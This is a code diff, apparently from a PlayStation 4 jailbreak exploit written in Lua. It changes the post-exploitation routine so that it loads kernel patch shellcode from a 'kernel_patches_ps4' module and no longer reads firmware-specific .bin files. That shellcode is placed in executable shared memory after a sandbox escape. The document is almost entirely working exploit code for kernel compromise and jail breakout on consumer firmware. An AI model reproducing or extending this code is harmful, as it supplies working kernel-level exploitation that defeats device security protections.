@@ -1705,7 +1705,17 @@ function post_exploitation_ps4()
         print("Sandbox escape complete ... root FS access and jail broken")
     end
 
-    function apply_patches_to_kernel_data_ps4()
+    local function apply_kernel_patches_ps4()
+        -- get kpatches shellcode
+        local bin_data = get_kernel_patches_shellcode()
+        if #bin_data == 0 then
+            print("Skipping kernel patches due to missing kernel patches shellcode.")
+            return
+        end
+        
+        local bin_data_addr = lua.resolve_value(bin_data)
+        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)
+
         local mapping_addr = uint64(0x920100000)
         local shadow_mapping_addr = uint64(0x926100000)
         
@@ -1728,36 +1738,6 @@ function post_exploitation_ps4()
         local PROT_RWX = bit32.bor(PROT_READ, PROT_WRITE, PROT_EXECUTE)
         
         local aligned_memsz = 0x10000
-        
-        local payload_path = "/data/"
-        if FW_VERSION == "9.00" then
-            payload_path = payload_path .. "900.bin"
-        elseif FW_VERSION == "9.03" or FW_VERSION == "9.04" then
-            payload_path = payload_path .. "903.bin"
-        elseif FW_VERSION == "9.50" or FW_VERSION == "9.51" or FW_VERSION == "9.60" then
-            payload_path = payload_path .. "950.bin"
-        elseif FW_VERSION == "10.00" or FW_VERSION == "10.01" then
-            payload_path = payload_path .. "1000.bin"
-        elseif FW_VERSION == "10.50" or FW_VERSION == "10.70" or FW_VERSION == "10.71" then
-            payload_path = payload_path .. "1050.bin"
-        elseif FW_VERSION == "11.00" then
-            payload_path = payload_path .. "1100.bin"
-        elseif FW_VERSION == "11.02" then
-            payload_path = payload_path .. "1102.bin"
-        elseif FW_VERSION == "11.50" or FW_VERSION == "11.52" then
-            payload_path = payload_path .. "1150.bin"
-        elseif FW_VERSION == "12.00" or FW_VERSION == "12.02" then
-            payload_path = payload_path .. "1200.bin"
-        end
-        
-        if not file_exists(payload_path) then
-            errorf("file not exist: %s", payload_path)
-        end
-        
-        -- read payload from disk
-        local bin_data = file_read(payload_path)
-        local bin_data_addr = lua.resolve_value(bin_data)
-        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)
         
         -- create shm with exec permission
         local exec_handle = syscall.jitshm_create(0, aligned_memsz, PROT_RWX)
@@ -1784,13 +1764,31 @@ function post_exploitation_ps4()
         syscall.close(write_handle)
     end
     
+    local function should_apply_kernel_patches()
+        local success, err = pcall(require, "kernel_patches_ps4")
+
+        if not success then
+            if string.find(err, "module .* not found") then
+                print("\nWarning! Skipping kernel patches due to missing file in savedata: 'kernel_patches_ps4.lua'.\nPlease update savedata from latest.\n")
+            else
+                print(err)
+            end
+            return false
+        end
+        return true
+    end
+    
     -- Run post-exploit logic
     local proc = kernel.addr.curproc
     calculate_kbase(evf_ptr)
     printf("Kernel Base Candidate: %s", hex(kernel.addr.data_base))
     verify_elf_header()
+    local apply_kpatches = should_apply_kernel_patches()
     escape_sandbox(proc)
-    apply_patches_to_kernel_data_ps4()
+    
+    if apply_kpatches then
+        apply_kernel_patches_ps4()
+    end
 end
 
 
